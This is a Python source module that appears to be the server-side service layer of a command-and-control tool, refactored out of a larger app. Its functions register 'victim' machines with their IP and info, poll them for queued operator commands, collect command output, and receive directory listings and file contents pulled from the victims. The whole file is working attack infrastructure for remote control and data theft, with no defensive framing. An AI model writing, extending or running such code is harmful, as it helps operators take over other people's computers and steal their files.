"""C2 service (P4.2) — business logic behind ``/api/c2/*`` routes.

Extracted verbatim from ``app/blueprints/capture_c2.py`` route bodies
(which themselves were moved verbatim from ``app.py`` at P3.3).  The
blueprint stays a thin HTTP adapter: request parsing, validation and
``jsonify`` remain there; session/queue bookkeeping (via the shared
``app.state.STORE`` StateStore) and persistence (via the frozen
``database.py`` module) live here.

No behavior change is intended — ``tests/char`` freezes every response
shape and the audit exercises these flows end-to-end.
"""
from __future__ import annotations

from datetime import datetime

import database as db

from app.state import STORE


def register_client(uid: str, info: dict, ip: str) -> None:
    """Victim registered: memory session + persistent row (restart-safe)."""
    STORE.c2_session_set(uid, info, ip)
    db.save_c2_session(uid, info, ip)


def poll(uid: str):
    """Victim poll: touch last_seen, dequeue one command (or ``None``)."""
    STORE.c2_session_update_last_seen(uid)  # no-op when uid unknown (legacy)
    db.update_c2_last_seen(uid)
    return STORE.c2_command_dequeue(uid)


def post_response(uid: str, output) -> None:
    """Victim posted command output: touch last_seen, append response."""
    STORE.c2_session_update_last_seen(uid)
    STORE.c2_response_append(uid, output, datetime.now().isoformat())


def list_clients() -> list:
    """Admin client listing: merge DB rows into memory, annotate status."""
    STORE.c2_sessions_import(db.get_all_c2_sessions())

    active = []
    now = datetime.now()
    for uid, sess in STORE.c2_all_sessions().items():
        if not uid:
            continue
        try:
            last = datetime.fromisoformat(sess['last_seen'])
            delta = (now - last).total_seconds()
            status = 'online' if delta < 20 else 'offline'
        except Exception:
            status = 'offline'

        active.append({
            'uid': uid,
            'ip': sess['ip'],
            'info': sess['info'],
            'status': status,
            'last_seen': sess['last_seen']
        })
    return active


def queue_command(uid: str, cmd) -> None:
    """Operator queued a command for ``uid``."""
    STORE.c2_command_enqueue(uid, cmd)


def drain_responses(uid: str) -> list:
    """Admin stream: return every buffered response and empty the queue."""
    return STORE.c2_response_drain(uid)


def take_file_list(uid: str):
    """Pop the victim's file-list payload (``None`` when not ready)."""
    return STORE.c2_file_list_drain(uid)


def take_download(uid: str):
    """Pop the victim's file-download payload (``None`` when not ready)."""
    return STORE.c2_download_drain(uid)


def store_file_list(uid: str, files, path) -> None:
    """Victim delivered a directory listing for ``uid``."""
    STORE.c2_file_list_set(uid, {'files': files, 'path': path})


def store_download(uid: str, content, filename) -> None:
    """Victim delivered requested file content for ``uid``."""
    STORE.c2_download_set(uid, {
        'file': {
            'content': content,
            'filename': filename
        }
    })


__all__ = [
    "register_client", "poll", "post_response", "list_clients",
    "queue_command", "drain_responses",
    "take_file_list", "take_download", "store_file_list", "store_download",
]
